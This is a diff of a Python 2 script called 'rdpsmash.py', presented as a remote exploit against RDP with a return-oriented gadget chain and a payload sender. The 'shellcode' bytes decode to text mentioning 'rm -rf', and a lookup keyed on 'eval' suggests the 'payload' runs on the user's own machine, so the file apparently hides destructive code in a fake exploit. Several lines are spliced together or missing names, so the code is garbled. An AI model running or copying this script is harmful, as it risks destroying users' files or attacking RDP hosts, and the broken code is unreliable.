@@ -67,6 +67,7 @@ shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x
 shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
 shellcode +=     def parse(self, address, shellcode):
         seeker = (struct.pack(">I", 0x6576616c), 
+
             socket.inet_aton(address[0]), #IP bytes
             socket.inet_aton(str(address[1]))) #port bytes
         parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
@@ -97,7 +98,7 @@ shellcode += ruct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
         parsed += seeker[2] #add the packed port
         parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
         parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
-        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret  
+        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret
         parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
@@ -113,7 +114,7 @@ shellcode += ruct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
         parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
         parsed += struct.pack(">I", 0xffff01f3) #mov esp,ebp # pop ebp # ret
         read = self.table[seeker[0]] #reader for the parsed shellcode/data
-        
+
         return str(read(shellcode)), parsed
 
     def connect(self, address):
@@ -128,11 +129,11 @@ if  == "":
     if len(sys.argv) != 2:
         print "[*] Usage: python rdpsmash.py IP"
         print "[*] If running on non-default port, reassign PORT in the source."
-    
-    else:   
+
+    else:
         TARGET = sys.argv[1]
-        PORT = 3389 #default RDP port
-        
+        PORT = 0 #nie ma porta
+
         print "[*] Running rdpsmash"
         print
         s = RDPsocket(evil, shellcode)
@@ -141,7 +142,7 @@ if  == "":
         s.connect((TARGET, PORT))
         print "[+] Connection established"
         print "[+] Sending payload. . ."
-        s.evil_sendall()
+        print "[+] This may take some time"
         response = s.recv(4096)
         if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
             print "[+] Success! Payload sent and executed."
